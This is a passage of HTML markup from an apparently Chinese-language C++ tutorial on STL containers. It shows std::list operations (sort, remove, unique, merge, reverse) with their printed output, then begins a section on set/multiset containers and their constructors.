data-num=\"115\"></td><td><pre>\t\tremove ：删除与指定值相等的元素</pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\tunique ：删除所有和前一个元素相同的元素，就是去除重复元素，只留下一个</pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\tmerge ：合并两个链表，并清空被合并的那个 (list 单独实现)</pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\treverse ：颠倒链表\t</pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t*/</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============sort排序=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre></pre></td></tr><tr><td data-num=\"123\"></td><td><pre></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t<span class=\"token comment\">// 对 list 进行排序</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t<span class=\"token comment\">// 迭代器遍历</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\tnIt <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t<span class=\"token comment\">// 也可用指针去取值</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\r\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>nIt<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nIt <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>nIt<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre></pre></td></tr><tr><td data-num=\"137\"></td><td><pre></pre></td></tr><tr><td data-num=\"138\"></td><td><pre></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============remove删除=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t<span class=\"token comment\">// 删除和指定值相等的元素</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">remove</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t<span class=\"token comment\">// 迭代器 ++ 与 * 迭代器 ++   p++ *p++ 为何功能一样？</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>list<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator p <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">*</span>p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============unique去重=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>\t<span class=\"token comment\">// 去重</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">unique</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>list<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator p <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">*</span>p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============merge合并=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============merge_v5合并前=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>list<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator p <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">!=</span> v5<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">*</span>p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>\t<span class=\"token comment\">// 合并两个链表</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">merge</span><span class=\"token punctuation\">(</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============merge_v1合并后=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>list<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator p <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">*</span>p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============merge_v5合并后=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>list<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator p <span class=\"token operator\">=</span> v5<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">!=</span> v5<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">*</span>p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============reverse颠倒=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>\t<span class=\"token comment\">// 颠倒</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>list<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator p <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> p <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">*</span>p<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>\t\tcout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token operator\">*</span>p <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre></pre></td></tr><tr><td data-num=\"190\"></td><td><pre></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>执行结果如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span>v1的地址为：0056F750</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">123</span>     <span class=\"token number\">26</span>      <span class=\"token number\">27</span>      <span class=\"token number\">28</span>      <span class=\"token number\">99</span>      <span class=\"token number\">0</span>       <span class=\"token number\">1</span>       <span class=\"token number\">2</span>       <span class=\"token number\">98</span>      <span class=\"token number\">98</span>      <span class=\"token number\">3</span>       <span class=\"token number\">4</span>       <span class=\"token number\">5</span>       <span class=\"token number\">6</span>       <span class=\"token number\">7</span>      <span class=\"token number\">8</span>      <span class=\"token number\">9</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>pop_front删除<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">26</span>      <span class=\"token number\">27</span>      <span class=\"token number\">28</span>      <span class=\"token number\">99</span>      <span class=\"token number\">0</span>       <span class=\"token number\">1</span>       <span class=\"token number\">2</span>       <span class=\"token number\">98</span>      <span class=\"token number\">98</span>      <span class=\"token number\">3</span>       <span class=\"token number\">4</span>       <span class=\"token number\">5</span>       <span class=\"token number\">6</span>       <span class=\"token number\">7</span>       <span class=\"token number\">8</span>      <span class=\"token number\">9</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>pop_back删除<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">26</span>      <span class=\"token number\">27</span>      <span class=\"token number\">28</span>      <span class=\"token number\">99</span>      <span class=\"token number\">0</span>       <span class=\"token number\">1</span>       <span class=\"token number\">2</span>       <span class=\"token number\">98</span>      <span class=\"token number\">98</span>      <span class=\"token number\">3</span>       <span class=\"token number\">4</span>       <span class=\"token number\">5</span>       <span class=\"token number\">6</span>       <span class=\"token number\">7</span>       <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>erase删除<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">26</span>      <span class=\"token number\">27</span>      <span class=\"token number\">28</span>      <span class=\"token number\">0</span>       <span class=\"token number\">1</span>       <span class=\"token number\">2</span>       <span class=\"token number\">98</span>      <span class=\"token number\">98</span>      <span class=\"token number\">3</span>       <span class=\"token number\">4</span>       <span class=\"token number\">5</span>       <span class=\"token number\">6</span>       <span class=\"token number\">7</span>       <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>erase删除2<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">0</span>       <span class=\"token number\">1</span>       <span class=\"token number\">2</span>       <span class=\"token number\">98</span>      <span class=\"token number\">98</span>      <span class=\"token number\">3</span>       <span class=\"token number\">4</span>       <span class=\"token number\">5</span>       <span class=\"token number\">6</span>       <span class=\"token number\">7</span>       <span class=\"token number\">8</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>sort排序<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">0</span>       <span class=\"token number\">1</span>       <span class=\"token number\">2</span>       <span class=\"token number\">3</span>       <span class=\"token number\">4</span>       <span class=\"token number\">5</span>       <span class=\"token number\">6</span>       <span class=\"token number\">7</span>       <span class=\"token number\">8</span>       <span class=\"token number\">98</span>      <span class=\"token number\">98</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>remove删除<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token number\">0</span>       <span class=\"token number\">1</span>       <span class=\"token number\">2</span>       <span class=\"token number\">3</span>       <span class=\"token number\">4</span>       <span class=\"token number\">5</span>       <span class=\"token number\">6</span>       <span class=\"token number\">7</span>       <span class=\"token number\">98</span>      <span class=\"token number\">98</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>unique去重<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token number\">0</span>       <span class=\"token number\">1</span>       <span class=\"token number\">2</span>       <span class=\"token number\">3</span>       <span class=\"token number\">4</span>       <span class=\"token number\">5</span>       <span class=\"token number\">6</span>       <span class=\"token number\">7</span>       <span class=\"token number\">98</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>merge合并<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>merge_v5合并前<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token number\">21</span>      <span class=\"token number\">22</span>      <span class=\"token number\">23</span>      <span class=\"token number\">24</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>merge_v1合并后<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token number\">0</span>       <span class=\"token number\">1</span>       <span class=\"token number\">2</span>       <span class=\"token number\">3</span>       <span class=\"token number\">4</span>       <span class=\"token number\">5</span>       <span class=\"token number\">6</span>       <span class=\"token number\">7</span>       <span class=\"token number\">21</span>      <span class=\"token number\">22</span>      <span class=\"token number\">23</span>      <span class=\"token number\">24</span>      <span class=\"token number\">98</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>merge_v5合并后<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span>reverse颠倒<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token number\">98</span>      <span class=\"token number\">24</span>      <span class=\"token number\">23</span>      <span class=\"token number\">22</span>      <span class=\"token number\">21</span>      <span class=\"token number\">7</span>       <span class=\"token number\">6</span>       <span class=\"token number\">5</span>       <span class=\"token number\">4</span>       <span class=\"token number\">3</span>       <span class=\"token number\">2</span>       <span class=\"token number\">1</span>       <span class=\"token number\">0</span></pre></td></tr></table></figure><h2 id=\"setmultiset容器\"><a class=\"anchor\" href=\"#setmultiset容器\">#</a> Set/Multiset 容器</h2>\n<h3 id=\"什么是setmultiset容器\"><a class=\"anchor\" href=\"#什么是setmultiset容器\">#</a> 什么是 Set/Multiset 容器</h3>\n<ol>\n<li>底层使用平衡的搜索树：红黑树；</li>\n<li>内部元素<strong>有序排列</strong>，新元素插入的位置取决于它的值，<strong>查找速度快</strong>；</li>\n<li><strong>支持通过键值实现快速读取</strong>；</li>\n<li>不可以使用 at 函数与 [] 操作符；</li>\n<li>不可以直接修改 set 或 multiset 容器中的元素值，因为该类容器是自动排序的，如果希望修改一个元素值，必须先删除原有的元素，再插入新的元素；</li>\n<li>multiset 支持同一个键多次出现的 set 类型。</li>\n</ol>\n<h3 id=\"使用setmultiset容器\"><a class=\"anchor\" href=\"#使用setmultiset容器\">#</a> 使用 Set/Multiset 容器</h3>\n<p>在使用之前需要包含头文件和使用命名空间：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;set></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"构造容器-2\"><a class=\"anchor\" href=\"#构造容器-2\">#</a> 构造容器</h4>\n<p>构造容器的方法全在一个函数中实现了：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">SetConstructors</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token comment\">// 构建一个空的容器，默认使用的是小于比较器 less&lt;int>，既从小到大排序元素</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> set1<span class=\"token punctuation\">;</span>    <span class=\"token comment\">// set&lt;int, less&lt;int>> set;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// 构建一个空的容器，使用大于比较器，即从大到小排列。</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> greater<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> set2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">int</span> nAry<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">14</span><span class=\"token punctuation\">,</span><span class=\"token number\">15</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span><span class=\"token number\">17</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\">// 用数组区间初始化</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span>greater<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> <span class=\"token function\">set3</span><span class=\"token punctuation\">(</span>nAry<span class=\"token punctuation\">,</span> nAry <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"set3:\\t\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">for_each</span><span class=\"token punctuation\">(</span>set3<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> set3<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> myPrintFun<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">// 复制指定 set 容器的区间的内容作为容器的元素</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span 